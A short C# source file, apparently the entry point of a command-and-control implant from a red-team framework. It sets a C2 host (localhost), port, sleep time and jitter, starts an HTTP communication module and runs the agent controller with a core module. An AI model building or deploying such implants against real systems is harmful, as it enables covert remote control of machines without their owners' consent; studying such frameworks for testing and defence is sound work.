using Agent.Models;
using Agent.Modules;
using Agent.Controllers;

namespace Agent
{
    public class Agent
    {
        public Agent() { ExecuteAgent(); }

        public static void Main(string[] args) { new Agent(); }

        public static void Execute() { new Agent(); }

        public void ExecuteAgent()
        {
            // Set Agent configuration
            var configController = new ConfigurationController();
            configController.SetOption(ConfigurationSettings.C2Host, "127.0.0.1");
            configController.SetOption(ConfigurationSettings.C2Port, 8080);
            configController.SetOption(ConfigurationSettings.SleepTime, 0); // seconds
            configController.SetOption(ConfigurationSettings.Jitter, 0); // percent

            // Start comm module
            var commModule = new HTTPCommModule();
            commModule.Initialise(configController);

            // Start the agent
            var agentController = new AgentController(configController, commModule);
            agentController.AddAgentModule(new CoreAgentModule());
            agentController.Run();
        }
    }
}